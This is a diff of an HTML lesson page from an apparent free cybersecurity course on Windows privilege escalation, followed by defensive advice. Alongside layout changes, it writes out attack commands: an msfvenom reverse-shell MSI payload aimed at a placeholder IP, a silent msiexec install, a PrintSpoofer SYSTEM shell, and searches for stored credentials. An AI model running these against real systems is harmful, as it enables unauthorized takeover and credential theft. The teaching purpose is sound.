@@ -3,12 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<base href="/">
 <title>Windows privilege escalation — Path 16 · KashSec Academy</title>
-<meta name="description" content="Windows privesc shares the same enumeration-first philosophy as Linux (previous lesson) but with an entirely different set of mechanisms — services, registry keys, tokens, and scheduled tasks replace ">
+<meta name="description" content="Windows privilege escalation: Services, tokens, Potato family.">
 <link rel="canonical" href="https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
 <meta property="og:title" content="Windows privilege escalation — Path 16 · KashSec Academy">
-<meta property="og:description" content="Windows privesc shares the same enumeration-first philosophy as Linux (previous lesson) but with an entirely different set of mechanisms — services, registry keys, tokens, and scheduled tasks replace ">
+<meta property="og:description" content="Windows privilege escalation: Services, tokens, Potato family.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html">
 <meta property="og:site_name" content="KashSec Academy">
@@ -17,53 +18,83 @@
 <meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Windows privilege escalation — Path 16 · KashSec Academy">
-<meta name="twitter:description" content="Windows privesc shares the same enumeration-first philosophy as Linux (previous lesson) but with an entirely different set of mechanisms — services, registry keys, tokens, and scheduled tasks replace ">
+<meta name="twitter:description" content="Windows privilege escalation: Services, tokens, Potato family.">
 <meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
 <meta name="theme-color" content="#0A0E13">
 <meta name="google-adsense-account" content="ca-pub-7042949574293510">
+<link rel="manifest" href="/manifest.json">
+<link rel="alternate" type="application/rss+xml" title="KashSec Academy — What's new" href="/feed.xml">
+<link rel="apple-touch-icon" href="/icons/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/styles.css">
+<script src="/ads.js" defer></script>
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"KashSec Academy","item":"https://kashsec.vercel.app/"},{"@type":"ListItem","position":2,"name":"Learning paths","item":"https://kashsec.vercel.app/lesson/"},{"@type":"ListItem","position":3,"name":"Path 16 — Advanced Cyber Topics","item":"https://kashsec.vercel.app/lesson/16-advanced/"},{"@type":"ListItem","position":4,"name":"Windows privilege escalation","item":"https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html"}]}
 </script>
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"LearningResource","name":"Windows privilege escalation","headline":"Windows privilege escalation","description":"Windows privesc shares the same enumeration-first philosophy as Linux (previous lesson) but with an entirely different set of mechanisms — services, registry keys, tokens, and scheduled tasks replace ","url":"https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html","inLanguage":"en","dateModified":"2026-07-26","learningResourceType":"Lesson","educationalLevel":"Advanced","timeRequired":"PT5M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"Services, tokens, Potato family.","isPartOf":{"@type":"Course","name":"Path 16: Advanced Cyber Topics","url":"https://kashsec.vercel.app/lesson/16-advanced/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html"}}
+{"@context":"https://schema.org","@type":"LearningResource","name":"Windows privilege escalation","headline":"Windows privilege escalation","description":"Windows privilege escalation: Services, tokens, Potato family.","url":"https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html","inLanguage":"en","dateModified":"2026-07-26","learningResourceType":"Lesson","educationalLevel":"Advanced","timeRequired":"PT5M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"Services, tokens, Potato family.","isPartOf":{"@type":"Course","name":"Path 16: Advanced Cyber Topics","url":"https://kashsec.vercel.app/lesson/16-advanced/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/16-advanced/windows-privesc.html"}}
 </script>
-<style>
-:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
-html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
-main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
-.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
-.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
-.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
-.crumb a{color:var(--teal);text-decoration:none}
-.pager{display:flex;justify-content:space-between;gap:1rem;margin-top:2.5rem;padding-top:1.2rem;border-top:1px solid var(--border);font-size:.88rem}
-.pager a{color:var(--teal);text-decoration:none}
-h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
-h1{font-size:2rem;margin:.5rem 0 1rem}
-h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
-a{color:var(--teal)}
-code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
-pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
-pre code{background:transparent;color:var(--text);padding:0}
-blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
-table{width:100%;border-collapse:collapse;margin:1rem 0}
-th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
-th{background:var(--surface)}
-img{max-width:100%;height:auto}
-footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
-</style>
 </head>
 <body>
-<main>
-  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="/#/lesson/16-advanced/windows-privesc">continue here →</a></div>
-  <div class="crumb"><a href="https://kashsec.vercel.app/">KashSec Academy</a> · <a href="https://kashsec.vercel.app/lesson/">Learning paths</a> · <a href="https://kashsec.vercel.app/lesson/16-advanced/">Path 16 — Advanced Cyber Topics</a> · Windows privilege escalation</div>
-  <article><h1>Windows privilege escalation</h1>
+<a class="skip" href="/lesson/16-advanced/windows-privesc.html#app">Skip to content</a>
+<header class="nav" id="siteNav">
+  <a class="brand" href="#/" aria-label="KashSec Academy — home">
+    <span class="brand-mark">
+      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+    </span>
+    <span class="brand-txt">KashSec<span class="amber">.</span></span>
+  </a>
+  <nav class="nav-links" id="navLinks" aria-label="Primary">
+    <a href="#/">Home</a>
+    <a href="#/course">Course</a>
+    <a href="#/tracks">Tracks</a>
+    <a href="#/labs">Labs</a>
+    <a href="#/tasks">Practice</a>
+    <a href="#/tools">Tools</a>
+    <a href="#/glossary">Glossary</a>
+    <a href="#/roadmap">Roadmap</a>
+    <a href="#/careers">Careers</a>
+    <a href="#/faq">FAQ</a>
+    <a href="#/progress">My Progress</a>
+    <a href="#" id="accountNavLink" class="account-nav-link" style="display:none">Sign in</a>
+  </nav>
+  <div class="nav-cta">
+    <button class="icon-btn" id="searchBtn" aria-label="Search lessons (Ctrl+K)" type="button" title="Search (Ctrl+K)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    </button>
+    <button class="icon-btn theme-toggle" id="themeToggle" aria-label="Toggle light/dark theme" aria-pressed="false" type="button">
+      <svg class="ico-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="ico-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+    <button class="icon-btn" id="randomLessonBtn" aria-label="Jump to a random lesson" type="button" title="Random lesson (R)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="3"/><circle cx="8" cy="8" r="1.4" fill="currentColor"/><circle cx="16" cy="8" r="1.4" fill="currentColor"/><circle cx="12" cy="12" r="1.4" fill="currentColor"/><circle cx="8" cy="16" r="1.4" fill="currentColor"/><circle cx="16" cy="16" r="1.4" fill="currentColor"/></svg>
+    </button>
+    <span class="streak-badge" id="streakBadge" title="Learning streak — visit on consecutive days to grow it" hidden>🔥<b id="streakN">0</b></span>
+    <a class="icon-btn progress-ring-btn" id="progressRingBtn" href="#/progress" aria-label="Your progress">
+      <svg viewBox="0 0 36 36"><circle class="ring-track" cx="18" cy="18" r="15.5"/><circle class="ring-fill" id="ringFill" cx="18" cy="18" r="15.5" stroke-dasharray="97.4" stroke-dashoffset="97.4"/></svg>
+    </a>
+    <button class="icon-btn" id="installBtn" aria-label="Install KashSec app for offline use" type="button" title="Install app" hidden>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+    </button>
+    <a class="btn-amber sm" id="startBtn" href="#/lesson/01-introduction">Start</a>
+    <button class="hamb" id="hamb" aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+  </div>
+</header>
+<main id="app" tabindex="-1">
+  <div class="reader-wrap"><div class="reader-main">
+    <nav class="reader-crumb" aria-label="Breadcrumb"><a href="https://kashsec.vercel.app/">KashSec Academy</a> · <a href="https://kashsec.vercel.app/lesson/">Learning paths</a> · <a href="https://kashsec.vercel.app/lesson/16-advanced/">Path 16 — Advanced Cyber Topics</a> · Windows privilege escalation</nav>
+    <div class="md" id="content"><article><h1>Windows privilege escalation</h1>
 <p>Windows privesc shares the same enumeration-first philosophy as Linux (previous lesson) but with an entirely different set of mechanisms — services, registry keys, tokens, and scheduled tasks replace SUID bits and cron jobs.</p>
 <h2>The systematic enumeration-first approach, Windows edition</h2>
 <pre><code class="language-powershell"># WinPEAS — the Windows sibling of LinPEAS, same philosophy:
 # Download and run winPEAS.exe (or the .bat version) on the target
 .\winPEASx64.exe
 </code></pre>
-<pre><code class="language-powershell"># Manual situational awareness, echoing Path 14.6&#39;s Windows commands:
+<pre><code class="language-powershell"># Manual situational awareness, echoing Path 14.6's Windows commands:
 whoami /all
 systeminfo
 net user
@@ -72,7 +103,7 @@ net localgroup administrators
 <p><code>whoami /all</code> is particularly valuable — it shows your current <strong>privileges and group memberships</strong>, several of which directly enable specific escalation techniques covered below.</p>
 <h2>The main Windows privesc vectors</h2>
 <h3>1. Unquoted service paths</h3>
-<p>If a Windows service&#39;s executable path contains spaces and <strong>isn&#39;t wrapped in quotes</strong>, Windows tries each space-separated segment as a potential executable, in order — letting an attacker plant a malicious executable earlier in that search path.</p>
+<p>If a Windows service's executable path contains spaces and <strong>isn't wrapped in quotes</strong>, Windows tries each space-separated segment as a potential executable, in order — letting an attacker plant a malicious executable earlier in that search path.</p>
 <pre><code>Vulnerable service path: C:\Program Files\My App\service.exe
 (unquoted — Windows will try, in order:)
   C:\Program.exe
@@ -80,25 +111,25 @@ net localgroup administrators
   C:\Program Files\My App\service.exe   (the intended one)
 </code></pre>
 <pre><code class="language-powershell"># Find services with unquoted paths containing spaces:
-wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows&quot; | findstr /i /v &quot;&quot;&quot;
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
 
 # If C:\Program Files\ is writable and the service runs as SYSTEM,
 # planting a malicious Program.exe there and restarting the service
 # (or waiting for a reboot) executes it with SYSTEM privileges.
 </code></pre>
 <h3>2. Weak service permissions</h3>
-<p>Even with a properly quoted path, if the <strong>service binary itself</strong>, or the service&#39;s configuration, is writable by a lower-privileged user:</p>
+<p>Even with a properly quoted path, if the <strong>service binary itself</strong>, or the service's configuration, is writable by a lower-privileged user:</p>
 <pre><code class="language-powershell"># Check service binary permissions with accesschk (Sysinternals):
-accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
+accesschk.exe -uwcqv "Authenticated Users" *
 
-# If you can modify a SYSTEM-running service&#39;s binary directly,
+# If you can modify a SYSTEM-running service's binary directly,
 # replace it with a malicious payload, then restart the service.
 </code></pre>
 <h3>3. AlwaysInstallElevated — an MSI installer misconfiguration</h3>
 <p>If two specific registry keys are both set to <code>1</code>, <strong>any</strong> user can install an MSI package with SYSTEM privileges, regardless of their normal permission level:</p>
 <pre><code class="language-powershell">reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-# Both showing &quot;AlwaysInstallElevated = 1&quot; means this technique works
+# Both showing "AlwaysInstallElevated = 1" means this technique works
 </code></pre>
 <pre><code class="language-bash"># Generate a malicious MSI payload with msfvenom (part of Metasploit, Path 14.5):
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o malicious.msi
@@ -116,7 +147,7 @@ msiexec /quiet /qn /i malicious.msi
 # modify the script, wait for the task to fire.
 </code></pre>
 <h3>5. Token impersonation — Potato-family exploits</h3>
-<p>Windows uses <strong>access tokens</strong> to represent a user&#39;s identity and privileges for a running process. Certain services running with the <code>SeImpersonatePrivilege</code> token privilege (common for service accounts) can be tricked into handing over a SYSTEM-level token via a family of well-documented exploits known as the <strong>&quot;Potato&quot; attacks</strong> (JuicyPotato, RoguePotato, PrintSpoofer, and successors):</p>
+<p>Windows uses <strong>access tokens</strong> to represent a user's identity and privileges for a running process. Certain services running with the <code>SeImpersonatePrivilege</code> token privilege (common for service accounts) can be tricked into handing over a SYSTEM-level token via a family of well-documented exploits known as the <strong>"Potato" attacks</strong> (JuicyPotato, RoguePotato, PrintSpoofer, and successors):</p>
 <pre><code class="language-powershell"># Check if your current token has SeImpersonatePrivilege:
 whoami /priv
 
@@ -124,7 +155,7 @@ whoami /priv
 PrintSpoofer.exe -i -c cmd
 # This spawns a SYSTEM-level command prompt
 </code></pre>
-<p>This vector has been a persistent theme in Windows privesc for years — new &quot;Potato&quot; variants emerge as Microsoft patches previous ones, making it a genuinely active area worth following as you specialise further.</p>
+<p>This vector has been a persistent theme in Windows privesc for years — new "Potato" variants emerge as Microsoft patches previous ones, making it a genuinely active area worth following as you specialise further.</p>
 <h3>6. Credentials in unexpected places</h3>
 <p>Directly analogous to Linux — search broadly:</p>
 <pre><code class="language-powershell"># PowerShell history often contains typed passwords:
@@ -134,24 +165,43 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 dir /s /b unattend.xml sysprep.inf sysprep.xml 2&gt;nul
 
 # Registry-stored credentials (e.g., for auto-login):
-reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 </code></pre>
 <h3>7. DLL hijacking — the Windows equivalent of PATH hijacking</h3>
-<p>Directly analogous to Linux&#39;s PATH hijacking (previous lesson), Windows applications often load DLLs by name without specifying a full path, following a defined <strong>search order</strong> that checks the application&#39;s own directory before checking trusted system directories. If an attacker can write a malicious DLL with the exact expected name into a directory earlier in that search order — often the application&#39;s own working directory, if it&#39;s writable — the application loads the attacker&#39;s code instead of the legitimate library the next time it runs:</p>
-<pre><code class="language-powershell"># A tool like Sysinternals&#39; Process Monitor (procmon) can reveal exactly
+<p>Directly analogous to Linux's PATH hijacking (previous lesson), Windows applications often load DLLs by name without specifying a full path, following a defined <strong>search order</strong> that checks the application's own directory before checking trusted system directories. If an attacker can write a malicious DLL with the exact expected name into a directory earlier in that search order — often the application's own working directory, if it's writable — the application loads the attacker's code instead of the legitimate library the next time it runs:</p>
+<pre><code class="language-powershell"># A tool like Sysinternals' Process Monitor (procmon) can reveal exactly
 # which DLLs a privileged process attempts to load and from where,
 # surfacing missing-DLL or wrong-order-search opportunities:
 procmon.exe /AcceptEula
 </code></pre>
-<p>Finding a legitimate application that&#39;s missing an expected DLL, running with elevated privileges, and writable by a lower-privileged user in its load path is a classic, high-value discovery — exactly the kind of finding the LOLBAS reference below catalogues extensively.</p>
+<p>Finding a legitimate application that's missing an expected DLL, running with elevated privileges, and writable by a lower-privileged user in its load path is a classic, high-value discovery — exactly the kind of finding the LOLBAS reference below catalogues extensively.</p>
 <h2>A systematic Windows privesc checklist</h2>
+<pre><code class="language-mermaid">flowchart TB
+    Start["🎯 Low-privilege shell obtained"]
+    Start --&gt; Enum["Run WinPEAS / whoami /all /priv"]
+    Enum --&gt; Unq["Check unquoted service paths"]
+    Enum --&gt; Svc["Check weak service/binary permissions"]
+    Enum --&gt; AIE["Check AlwaysInstallElevated registry keys"]
+    Enum --&gt; Task["Check scheduled tasks"]
+    Enum --&gt; Token["Check SeImpersonatePrivilege → Potato attacks"]
+    Enum --&gt; Cred["Search for stored/unattended credentials"]
+
+    style Start fill:#111927,color:#8496A6,stroke:#8496A6
+    style Enum fill:#2b1f0a,color:#EFA43A,stroke:#EFA43A
+    style Unq fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style Svc fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style AIE fill:#2b1010,color:#E05548,stroke:#E05548
+    style Task fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style Token fill:#2b1010,color:#E05548,stroke:#E05548
+    style Cred fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+</code></pre>
 <h3>8. Registry AutoRuns and startup persistence as an escalation clue</h3>
-<p>Beyond the credential-hunting registry check above, worth a dedicated look: entries in <code>HKLM\...\Run</code> and startup folders reveal what executes automatically at boot or logon, often <em>as SYSTEM</em> or as a specific service account. If any of those startup entries point to a script or executable writable by a lower-privileged user, replacing it achieves the same &quot;wait for it to run with elevated privileges&quot; outcome as the cron/scheduled-task techniques above — Sysinternals&#39; <strong>Autoruns</strong> tool is the standard way to enumerate every such entry on a system in one pass rather than checking each registry location manually.</p>
-<h2>The defender&#39;s view</h2>
+<p>Beyond the credential-hunting registry check above, worth a dedicated look: entries in <code>HKLM\...\Run</code> and startup folders reveal what executes automatically at boot or logon, often <em>as SYSTEM</em> or as a specific service account. If any of those startup entries point to a script or executable writable by a lower-privileged user, replacing it achieves the same "wait for it to run with elevated privileges" outcome as the cron/scheduled-task techniques above — Sysinternals' <strong>Autoruns</strong> tool is the standard way to enumerate every such entry on a system in one pass rather than checking each registry location manually.</p>
+<h2>The defender's view</h2>
 <ul>
 <li><strong>Quote all service paths</strong> containing spaces.</li>
-<li><strong>Audit service and binary permissions</strong> — services running as SYSTEM shouldn&#39;t have writable binaries/configs for lower-privileged users.</li>
-<li><strong>Disable AlwaysInstallElevated</strong> unless there&#39;s a genuine, well-understood operational reason.</li>
+<li><strong>Audit service and binary permissions</strong> — services running as SYSTEM shouldn't have writable binaries/configs for lower-privileged users.</li>
+<li><strong>Disable AlwaysInstallElevated</strong> unless there's a genuine, well-understood operational reason.</li>
 <li><strong>Patch promptly</strong> against known Potato-family exploits — Microsoft has released mitigations for many variants over time.</li>
 <li><strong>Never leave credentials</strong> in unattended install files, registry auto-login keys, or scripts — use proper secrets management (Windows Credential Manager, or enterprise secrets vaults).</li>
 <li><strong>Restrict <code>SeImpersonatePrivilege</code></strong> to only the specific service accounts that genuinely require it.</li>
@@ -171,20 +221,22 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 whoami /priv
 
 # 4. Check for unquoted service paths:
-wmic service get name,pathname,startmode | findstr /i /v &quot;C:\Windows&quot;
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
 </code></pre>
 <p>Work through at least one TryHackMe or HackTheBox Windows privesc room, deliberately identifying the specific vector before consulting a walkthrough — the pattern-recognition muscle matters more than memorising any single technique.</p>
-<p><code>whoami /priv</code> shows your current token has <code>SeImpersonatePrivilege</code> enabled. Which well-known family of exploits does this specifically enable, and what&#39;s the general mechanism?</p>
-<details><summary>Show answer</summary>The <strong>"Potato" family</strong> of exploits (JuicyPotato, RoguePotato, PrintSpoofer, and successors). These tools trick a privileged Windows service or component (often via a coerced NTLM authentication or a local RPC/COM interaction) into handing over a <strong>SYSTEM-level access token</strong> to the process holding <code>SeImpersonatePrivilege</code>, effectively letting a service-account-level foothold escalate directly to full SYSTEM privileges without needing to exploit a separate memory-corruption vulnerability at all.</details><h2>Key terms</h2>
+<p>:::challenge Test yourself
+<code>whoami /priv</code> shows your current token has <code>SeImpersonatePrivilege</code> enabled. Which well-known family of exploits does this specifically enable, and what's the general mechanism?</p>
+<details><summary>Show answer</summary>The <strong>"Potato" family</strong> of exploits (JuicyPotato, RoguePotato, PrintSpoofer, and successors). These tools trick a privileged Windows service or component (often via a coerced NTLM authentication or a local RPC/COM interaction) into handing over a <strong>SYSTEM-level access token</strong> to the process holding <code>SeImpersonatePrivilege</code>, effectively letting a service-account-level foothold escalate directly to full SYSTEM privileges without needing to exploit a separate memory-corruption vulnerability at all.</details>
+:::<h2>Key terms</h2>
 <ul>
 <li><strong>WinPEAS</strong> — the Windows-specific automated privesc enumeration script.</li>
 <li><strong>Unquoted service path</strong> — a vulnerable service configuration allowing binary planting via ambiguous path parsing.</li>
 <li><strong>AlwaysInstallElevated</strong> — a registry misconfiguration allowing any user to install MSI packages with SYSTEM privileges.</li>
-<li><strong>Access token / SeImpersonatePrivilege</strong> — Windows&#39;s identity/privilege representation and the specific privilege enabling Potato-family exploits.</li>
+<li><strong>Access token / SeImpersonatePrivilege</strong> — Windows's identity/privilege representation and the specific privilege enabling Potato-family exploits.</li>
 </ul>
 <h2>Recap</h2>
 <ul>
-<li>Windows privesc mirrors Linux&#39;s enumeration-first philosophy with entirely different mechanisms — services, registry, tokens, scheduled tasks.</li>
+<li>Windows privesc mirrors Linux's enumeration-first philosophy with entirely different mechanisms — services, registry, tokens, scheduled tasks.</li>
 <li>Unquoted service paths, weak service permissions, AlwaysInstallElevated, and Potato-family token exploits are the main vectors.</li>
 <li>WinPEAS and <code>whoami /priv</code>/<code>/all</code> are the essential starting points for any Windows privesc enumeration.</li>
 <li>Credentials in unattended install files and registry auto-login keys remain a surprisingly common, low-tech escalation path.</li>
@@ -198,19 +250,67 @@ wmic service get name,pathname,startmode | findstr /i /v &quot;C:\Windows&quot;
 <li><a href="https://lolbas-project.github.io/">GTFOBins-equivalent for Windows: LOLBAS</a> — Living Off the Land Binaries and Scripts for Windows.</li>
 </ul>
 <p><strong>Next up →</strong> <a href="#/lesson/16-advanced/windows-privesc-tools-deep-dive">Windows privilege escalation tools, deep dive</a></p>
-<nav class="pager"><a href="/lesson/16-advanced/linux-privesc-tools-deep-dive.html">← Linux privesc tools, deep dive</a><a href="/lesson/16-advanced/windows-privesc-tools-deep-dive.html">Windows privesc tools, deep dive →</a></nav></article>
-  <footer>© KashSec Academy · <a href="/lesson/">All learning paths</a> · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+<nav class="pager"><a href="/lesson/16-advanced/linux-privesc-tools-deep-dive.html">← Linux privesc tools, deep dive</a><a href="/lesson/16-advanced/windows-privesc-tools-deep-dive.html">Windows privesc tools, deep dive →</a></nav></article></div>
+  </div></div>
 </main>
-<script>
-// Redirect actual users into the SPA. Search-engine crawlers get to read
-// the content above before the redirect fires.
-(function(){
-  try {
-    var target = "/#/lesson/16-advanced/windows-privesc";
-    // Only redirect from the .html file, not from the SPA route itself.
-    if (location.pathname.endsWith('.html') || location.pathname.endsWith('/')) location.replace(target);
-  } catch (e) {}
-})();
-</script>
+<footer class="footer">
+  <div class="foot-top">
+    <div class="foot-brand">
+      <div class="brand">
+        <span class="brand-mark">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+        </span>
+        <span class="brand-txt">KashSec<span class="amber">.</span></span>
+      </div>
+      <p>Free cybersecurity education for complete beginners. Start from zero, learn by doing, and reach a real career.</p>
+    </div>
+    <div class="foot-cols">
+      <div><h4>Learn</h4>
+        <a href="#/course">All paths</a>
+        <a href="#/tracks">Tracks</a>
+        <a href="#/labs">Labs</a>
+        <a href="#/glossary">Glossary</a>
+        <a href="#/review">Flashcards</a>
+        <a href="#/daily">Daily challenge</a>
+        <a href="#/weekly">Weekly challenges</a>
+        <a href="#/quiz/shuffle">Shuffle quiz</a>
+        <a href="#/tasks">Practice tasks</a>
+        <a href="#/exam">Timed mock exam</a>
+        <a href="#/search">Search</a>
+      </div>
+      <div><h4>Explore</h4>
+        <a href="#/tools">Tools</a>
+        <a href="#/careers">Careers</a>
+        <a href="#/interview">Interview bank</a>
+        <a href="#/certs">Certification roadmap</a>
+        <a href="#/faq">FAQ</a>
+      </div>
+      <div><h4>About</h4>
+        <a href="#/about">About KashSec</a>
+        <a href="#/contact">Contact</a>
+        <a href="#/changelog">What's new</a>
+        <a href="/feed.xml">RSS feed</a>
+      </div>
+      <div><h4>Legal</h4>
+        <a href="#/privacy">Privacy policy</a>
+        <a href="#/terms">Terms of use</a>
+      </div>
+    </div>
+  </div>
+  <div class="foot-bottom">
+    <span>© <span id="year"></span> KashSec Academy · Free forever</span>
+    <span class="made">Learn · Practise · Get hired</span>
+  </div>
+</footer>
+<script src="quizzes.js" defer></script>
+<script src="lesson-hashes.js" defer></script>
+<script src="lesson-updated.js" defer></script>
+<script src="vendor/purify.min.js" defer></script>
+<script src="sync.js" defer></script>
+<script src="app.js" defer></script>
+<script src="analytics.js" defer></script>
+<script type="module" src="speed-insights.js"></script>
+<script type="module" src="web-analytics.js"></script>
+
 </body>
 </html>
